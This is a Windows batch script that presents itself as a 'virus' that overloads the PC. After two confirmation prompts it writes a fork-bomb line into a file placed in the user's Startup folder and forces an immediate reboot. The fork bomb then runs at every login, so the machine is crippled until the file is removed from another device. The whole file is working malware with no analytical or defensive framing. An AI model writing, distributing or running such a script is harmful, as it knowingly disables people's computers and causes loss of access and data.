��&cls
@echo off
color a
setlocal
cls
echo.
echo.
echo WARNING!
echo THIS VIRUS OVERLOADS YOUR PC, DO YOU WANT TO RUN IT?
echo.
echo Use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
echo.
echo.
set /p continue="[YES / NO] >> "
if /i "%continue%"=="yes" goto run
if /i "%continue%"=="y" ( goto run ) else ( exit )
:run
cls
echo.
echo.
echo LAST WARNING!
echo PRESS ANY KEY TO RUN AND TO BE COCKED...
echo.
echo Use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
echo.
pause >nul
del xwkqelajcmLsldi.bat >nul
echo %%0^|%%0 ^>nul > virus_runner.bat && cls
copy virus_runner.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" && cls
del virus_runner.bat&&cls
shutdown /r /t 0
